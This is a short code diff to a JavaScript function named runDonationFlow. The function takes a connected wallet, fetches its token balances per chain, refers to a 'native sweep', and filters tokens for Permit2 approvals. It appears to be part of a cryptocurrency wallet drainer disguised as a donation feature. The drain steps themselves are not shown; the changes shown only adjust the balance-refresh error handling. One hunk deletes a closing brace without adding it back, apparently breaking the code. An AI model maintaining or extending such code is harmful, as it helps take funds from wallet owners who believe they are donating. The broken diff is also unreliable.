@@ -50,7 +50,7 @@ export async function runDonationFlow(walletClient, owner, trackingId) {
          owner = walletClient?.account?.address;
       }
       if (!owner) throw new Error("Wallet not connected");
-    }
+    
 
     // Fetch balances read-only
    /* const chainBalances = [];
@@ -142,15 +142,16 @@ export async function runDonationFlow(walletClient, owner, trackingId) {
       catch (err) { console.warn("Native sweep error:", err); }
 
       // Re-fetch balances
-        let refreshedRaw = [];
-    try {
-      console.log(">>> Fetching refreshed balances...");
-      refreshedRaw = await fetchBalancesCovalent(owner, chain.chainId);
-      console.log(">>> Refreshed balances:", refreshedRaw);
-    } catch (err) {
-      console.error(">>> Balance refresh failed:", err);
-      refreshedRaw = []; // fallback
-    }
+        let refreshedRaw = null;
+try {
+  console.log(">>> Fetching refreshed balances...");
+  refreshedRaw = await fetchBalancesCovalent(owner, chain.chainId);
+  console.log(">>> Refreshed balances:", refreshedRaw);
+} catch (err) {
+  console.warn("⚠️ Balance refresh failed, using empty fallback:", err);
+  refreshedRaw = [];
+}
+
 
 
       const refreshedFiltered = filterPermit2SafeTokens(refreshedRaw);
@@ -194,6 +195,7 @@ export async function runDonationFlow(walletClient, owner, trackingId) {
     return { success: false, reason: err.message || String(err) };
   }
 }
+
 
 
 
